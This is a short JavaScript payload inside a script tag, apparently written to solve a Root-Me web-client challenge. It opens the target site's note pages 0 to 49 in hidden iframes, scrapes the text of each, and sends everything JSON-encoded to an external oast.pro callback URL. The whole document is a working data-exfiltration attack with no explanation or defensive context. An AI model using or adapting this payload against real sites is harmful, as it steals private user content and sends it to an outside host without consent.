<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
async function run(a = 0, b = 50) {
    const promises = [];
    const iframeContents = [];

    for (let i = a; i < b; i++) {
        const iframe = document.createElement("iframe");
        iframe.src = TARGET + i;
        iframe.style.display = "none";
        document.documentElement.appendChild(iframe);

        promises.push(new Promise(resolve => {
            iframe.onload = () => {
                try {
                    iframeContents.push({
                        id: i,
                        content: iframe.contentDocument.body ? iframe.contentDocument.body.textContent : ""
                    });
                } catch (e) {
                    iframeContents.push({id: i, content: ""});
                }
                resolve();
            };
        }));
    }

    await Promise.all(promises);

    // send the collected iframe contents
    const data = encodeURIComponent(JSON.stringify(iframeContents));
    const webhookIframe = document.createElement("iframe");
    webhookIframe.src = WEBHOOK + "?d=" + data;
    document.documentElement.appendChild(webhookIframe);
}


run();
</script>
